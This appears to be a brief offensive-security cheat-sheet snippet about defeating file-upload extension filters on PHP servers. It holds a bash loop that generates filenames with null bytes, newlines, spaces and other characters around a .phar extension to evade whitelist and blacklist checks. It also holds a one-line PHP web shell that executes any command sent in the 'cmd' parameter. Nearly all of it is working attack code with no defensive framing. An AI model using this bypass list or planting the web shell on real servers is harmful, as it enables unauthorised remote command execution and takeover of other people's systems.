Escape both whitelist and blacklist checks for php servers
```bash
ext = ".phar";
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
        echo "test$char$ext.jpg" >> wordlist.txt
        echo "test$ext$char.jpg" >> wordlist.txt
        echo "test.jpg$char$ext" >> wordlist.txt
        echo "test.jpg$ext$char" >> wordlist.txt
done
```

Example test.php

```php
<?php echo(shell_exec($_GET['cmd'])); ?>
```
